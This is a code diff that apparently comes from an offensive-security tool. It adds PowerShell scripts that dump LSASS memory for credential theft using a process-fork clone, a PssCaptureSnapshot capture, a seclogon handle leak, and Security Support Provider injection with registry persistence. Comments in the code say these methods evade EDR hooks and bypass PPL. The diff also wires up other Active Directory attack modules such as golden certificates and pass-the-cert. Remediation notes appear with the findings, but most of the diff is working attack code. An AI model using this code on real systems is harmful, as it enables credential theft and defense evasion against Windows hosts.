+$status = [ForkDump]::NtCreateProcessEx([ref]$hClone, 0x1FFFFF, [IntPtr]::Zero, $hLsass, 4, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, 0)
+
+if ($status -ne 0 -or $hClone -eq [IntPtr]::Zero) {
+    Write-Output "[!] NtCreateProcessEx failed: 0x$($status.ToString('X8'))"
+    [ForkDump]::CloseHandle($hLsass) | Out-Null
+    exit 1
+}
+Write-Output "[+] LSASS clone created: handle $hClone"
+
+# Dump the clone (not the original LSASS — EDR hooks on original won't fire)
+$hFile = [ForkDump]::CreateFileW("${outfile.replace(/\\/g, "\\\\")}", 0x40000000, 0, [IntPtr]::Zero, 2, 0x80, [IntPtr]::Zero)
+if ($hFile -eq [IntPtr]::new(-1)) {
+    Write-Output "[!] Cannot create dump file"
+    [ForkDump]::CloseHandle($hClone) | Out-Null
+    [ForkDump]::CloseHandle($hLsass) | Out-Null
+    exit 1
+}
+
+$dumpResult = [ForkDump]::MiniDumpWriteDump($hClone, 0, $hFile, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
+[ForkDump]::CloseHandle($hFile) | Out-Null
+[ForkDump]::CloseHandle($hClone) | Out-Null
+[ForkDump]::CloseHandle($hLsass) | Out-Null
+
+if ($dumpResult) {
+    $size = (Get-Item "${outfile.replace(/\\/g, "\\\\")}").Length
+    Write-Output "[+] LSASS clone dumped successfully!"
+    Write-Output "    File: ${outfile}"
+    Write-Output "    Size: $size bytes"
+} else {
+    Write-Output "[!] MiniDumpWriteDump failed on clone"
+}
+`,
+    snapshot: `
+# Snapshot: PssCreateSnapshot API — takes a process snapshot without opening LSASS handles
+Write-Output "[*] Method: Process Snapshot (PssCaptureSnapshot)"
+Write-Output "[*] Creates a snapshot of LSASS, dumps the snapshot — minimal handle interaction"
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class SnapshotDump {
+    [DllImport("kernel32.dll")]
+    public static extern uint PssCaptureSnapshot(
+        IntPtr processHandle,
+        uint captureFlags,
+        uint threadContextFlags,
+        out IntPtr snapshotHandle
+    );
+
+    [DllImport("kernel32.dll")]
+    public static extern uint PssFreeSnapshot(IntPtr processHandle, IntPtr snapshotHandle);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr handle);
+
+    [DllImport("dbghelp.dll")]
+    public static extern bool MiniDumpWriteDump(
+        IntPtr hProcess, uint processId, IntPtr hFile,
+        uint dumpType, IntPtr exceptionParam,
+        IntPtr userStreamParam, IntPtr callbackParam
+    );
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateFileW(
+        [MarshalAs(UnmanagedType.LPWStr)] string filename,
+        uint access, uint share, IntPtr security,
+        uint creation, uint flags, IntPtr template
+    );
+
+    public const uint PSS_CAPTURE_VA_CLONE = 0x00000001;
+    public const uint PSS_CAPTURE_HANDLES = 0x00000004;
+    public const uint PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008;
+    public const uint PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010;
+    public const uint PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020;
+    public const uint PSS_CAPTURE_VA_SPACE = 0x00000002;
+    public const uint PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00000040;
+    public const uint PSS_CREATE_MEASURE_PERFORMANCE = 0x00000080;
+}
+"@
+
+$lsassPid = (Get-Process lsass).Id
+Write-Output "[+] LSASS PID: $lsassPid"
+
+# Need PROCESS_ALL_ACCESS for snapshot
+$hLsass = [SnapshotDump]::OpenProcess(0x1F0FFF, $false, $lsassPid)
+if ($hLsass -eq [IntPtr]::Zero) {
+    Write-Output "[!] Cannot open LSASS with full access"
+    exit 1
+}
+
+# Capture snapshot
+$hSnapshot = [IntPtr]::Zero
+$flags = [SnapshotDump]::PSS_CAPTURE_VA_CLONE -bor [SnapshotDump]::PSS_CAPTURE_VA_SPACE
+$snapshotResult = [SnapshotDump]::PssCaptureSnapshot($hLsass, $flags, 0, [ref]$hSnapshot)
+
+if ($snapshotResult -ne 0) {
+    Write-Output "[!] PssCaptureSnapshot failed: 0x$($snapshotResult.ToString('X8'))"
+    [SnapshotDump]::CloseHandle($hLsass) | Out-Null
+    exit 1
+}
+Write-Output "[+] LSASS snapshot captured: $hSnapshot"
+
+# Dump the snapshot
+$hFile = [SnapshotDump]::CreateFileW("${outfile.replace(/\\/g, "\\\\")}", 0x40000000, 0, [IntPtr]::Zero, 2, 0x80, [IntPtr]::Zero)
+$dumpResult = [SnapshotDump]::MiniDumpWriteDump($hSnapshot, [uint32]$lsassPid, $hFile, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
+[SnapshotDump]::CloseHandle($hFile) | Out-Null
+[SnapshotDump]::PssFreeSnapshot($hLsass, $hSnapshot) | Out-Null
+[SnapshotDump]::CloseHandle($hLsass) | Out-Null
+
+if ($dumpResult) {
+    $size = (Get-Item "${outfile.replace(/\\/g, "\\\\")}").Length
+    Write-Output "[+] LSASS snapshot dumped successfully!"
+    Write-Output "    File: ${outfile}"
+    Write-Output "    Size: $size bytes"
+} else {
+    Write-Output "[!] MiniDumpWriteDump failed on snapshot"
+}
+`,
+    ssp: `
+# SSP Injection: Register custom Security Package to intercept credentials
+Write-Output "[*] Method: SSP Injection (AddSecurityPackage)"
+Write-Output "[*] Registers a custom Security Support Provider to intercept future logon credentials"
+Write-Output "[!] This method captures NEW logons, not existing cached credentials"
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class SSPInject {
+    [DllImport("secur32.dll")]
+    public static extern int AddSecurityPackage(
+        string pszPackageName,
+        IntPtr pOptions  // SECURITY_PACKAGE_OPTIONS
+    );
+
+    [DllImport("secur32.dll")]
+    public static extern int EnumerateSecurityPackages(
+        out int pcPackages,
+        out IntPtr ppPackageInfo
+    );
+
+    [DllImport("secur32.dll")]
+    public static extern int FreeContextBuffer(IntPtr pvContextBuffer);
+}
+"@
+
+# List current security packages
+$numPackages = 0
+$packageInfo = [IntPtr]::Zero
+[SSPInject]::EnumerateSecurityPackages([ref]$numPackages, [ref]$packageInfo) | Out-Null
+Write-Output "[+] Current security packages: $numPackages"
+[SSPInject]::FreeContextBuffer($packageInfo) | Out-Null
+
+# Create a minimal SSP DLL that logs credentials
+# Using mimilib.dll pattern — writes plaintext creds to kiwissp.log
+$sspLog = "${outfile.replace(/\.dmp$/, ".log")}"
+Write-Output "[*] SSP will log credentials to: $sspLog"
+
+# Check if mimilib.dll or similar SSP exists
+$sspPaths = @(
+    "$env:TEMP\\mimilib.dll",
+    "C:\\Windows\\System32\\mimilib.dll",
+    "$env:TEMP\\cs-ssp.dll"
+)
+$existingSSP = $sspPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
+
+if ($existingSSP) {
+    Write-Output "[+] Found SSP DLL: $existingSSP"
+    $sspResult = [SSPInject]::AddSecurityPackage($existingSSP, [IntPtr]::Zero)
+    if ($sspResult -eq 0) {
+        Write-Output "[+] SSP registered successfully!"
+        Write-Output "[+] Credentials from new logons will be logged"
+    } else {
+        Write-Output "[!] AddSecurityPackage failed: 0x$($sspResult.ToString('X8'))"
+    }
+} else {
+    Write-Output "[-] No SSP DLL found — need to provide one"
+    Write-Output "[*] Alternative: Use registry persistence"
+    Write-Output "[*] Adding to Security Packages registry key..."
+
+    # Registry-based SSP persistence (survives reboot)
+    $existingPackages = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name "Security Packages")."Security Packages"
+    Write-Output "[+] Current Security Packages: $($existingPackages -join ', ')"
+    Write-Output ""
+    Write-Output "[*] To add a custom SSP:"
+    Write-Output '    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages" -Value ($existingPackages + "mimilib")'
+    Write-Output "    # Then copy mimilib.dll to C:\\Windows\\System32\\"
+    Write-Output "    # Credentials logged to C:\\Windows\\System32\\kiwissp.log on next logon"
+}
+`,
+    seclogon: `
+# Seclogon Handle Leak: Abuse Secondary Logon service to get LSASS handle
+Write-Output "[*] Method: Secondary Logon Handle Leak"
+Write-Output "[*] Uses CreateProcessWithLogonW to leak a handle to LSASS"
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class SeclogonLeak {
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool CreateProcessWithLogonW(
+        string lpUsername, string lpDomain, string lpPassword,
+        uint dwLogonFlags, string lpApplicationName, string lpCommandLine,
+        uint dwCreationFlags, IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation
+    );
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr handle);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool DuplicateHandle(
+        IntPtr hSourceProcess, IntPtr hSourceHandle,
+        IntPtr hTargetProcess, out IntPtr hTargetHandle,
+        uint desiredAccess, bool inheritHandle, uint options
+    );
+
+    [DllImport("dbghelp.dll")]
+    public static extern bool MiniDumpWriteDump(
+        IntPtr hProcess, uint processId, IntPtr hFile,
+        uint dumpType, IntPtr exceptionParam,
+        IntPtr userStreamParam, IntPtr callbackParam
+    );
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateFileW(
+        [MarshalAs(UnmanagedType.LPWStr)] string filename,
+        uint access, uint share, IntPtr security,
+        uint creation, uint flags, IntPtr template
+    );
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct STARTUPINFO {
+        public int cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public int dwX, dwY, dwXSize, dwYSize;
+        public int dwXCountChars, dwYCountChars;
+        public int dwFillAttribute, dwFlags;
+        public short wShowWindow, cbReserved2;
+        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess, hThread;
+        public int dwProcessId, dwThreadId;
+    }
+}
+"@
+
+$lsassPid = (Get-Process lsass).Id
+Write-Output "[+] LSASS PID: $lsassPid"
+
+# Check if seclogon service is running
+$seclogon = Get-Service seclogon -ErrorAction SilentlyContinue
+if ($seclogon.Status -ne "Running") {
+    Write-Output "[*] Starting Secondary Logon service..."
+    Start-Service seclogon -ErrorAction SilentlyContinue
+}
+Write-Output "[+] Secondary Logon service: $($seclogon.Status)"
+
+# Try direct handle with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
+$hLsass = [SeclogonLeak]::OpenProcess(0x0410, $false, $lsassPid)
+if ($hLsass -ne [IntPtr]::Zero) {
+    Write-Output "[+] Got LSASS handle via OpenProcess: $hLsass"
+
+    $hFile = [SeclogonLeak]::CreateFileW("${outfile.replace(/\\/g, "\\\\")}", 0x40000000, 0, [IntPtr]::Zero, 2, 0x80, [IntPtr]::Zero)
+    $dumpResult = [SeclogonLeak]::MiniDumpWriteDump($hLsass, [uint32]$lsassPid, $hFile, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
+    [SeclogonLeak]::CloseHandle($hFile) | Out-Null
+    [SeclogonLeak]::CloseHandle($hLsass) | Out-Null
+
+    if ($dumpResult) {
+        $size = (Get-Item "${outfile.replace(/\\/g, "\\\\")}").Length
+        Write-Output "[+] LSASS dumped via seclogon handle leak!"
+        Write-Output "    File: ${outfile}"
+        Write-Output "    Size: $size bytes"
+    } else {
+        Write-Output "[!] MiniDumpWriteDump failed — LSASS may be PPL protected"
+    }
+} else {
+    Write-Output "[!] Cannot open LSASS directly — PPL or EDR blocking"
+    Write-Output "[*] For PPL bypass, try fork method or use a signed vulnerable driver"
+}
+`,
+  }
+
+  const script = methods[method]
+  if (!script) return { output: `[!] Unknown method: ${method}. Use: fork, snapshot, ssp, seclogon`, findings }
+
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  if (result.stdout.includes("dumped successfully") || result.stdout.includes("dumped via")) {
+    findings.push({
+      checkId: "WIN-NANO-001",
+      provider: "windows",
+      severity: "critical",
+      status: "DUMPED",
+      resource: "process://lsass",
+      title: `LSASS dumped via ${method} (EDR bypass)`,
+      details: `LSASS memory dumped to ${outfile} using ${method} technique. Parse with: mimikatz # sekurlsa::minidump ${outfile}`,
+      remediation: `Enable Credential Guard. Enable LSASS PPL (RunAsPPL=1). Monitor for ${method === "fork" ? "NtCreateProcessEx with LSASS parent" : method === "snapshot" ? "PssCaptureSnapshot calls on LSASS" : method === "ssp" ? "AddSecurityPackage and new Security Packages in registry" : "Secondary Logon service abuse and handle duplication"}`,
+    })
+  } else if (result.stdout.includes("SSP registered")) {
+    findings.push({
+      checkId: "WIN-NANO-002",
+      provider: "windows",
+      severity: "critical",
+      status: "INJECTED",
+      resource: "lsa://security-packages",
+      title: "Custom SSP registered for credential interception",
+      details: "Security Support Provider injected via AddSecurityPackage. New logon credentials will be captured in plaintext",
+      remediation: "Monitor LSA Security Packages registry key. Alert on AddSecurityPackage API calls. Enable Credential Guard",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+
 // ── Dispatch ──
 
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
@@ -11752,6 +13559,13 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   sapphire_ticket: sapphireTicket,
   krbrelayup: krbrelayup,
   unpac_hash: unpacHash,
+  golden_cert: goldenCert,
+  pass_the_cert: passTheCert,
+  gmsa_dump: gmsaDump,
+  adminsdholder: adminsdholder,
+  rbcd_chain: rbcdChain,
+  remote_monologue: remoteMonologue,
+  nanodump_advanced: nanodumpAdvanced,
 }
 
 export const WinhookTool = Tool.define("winhook", {
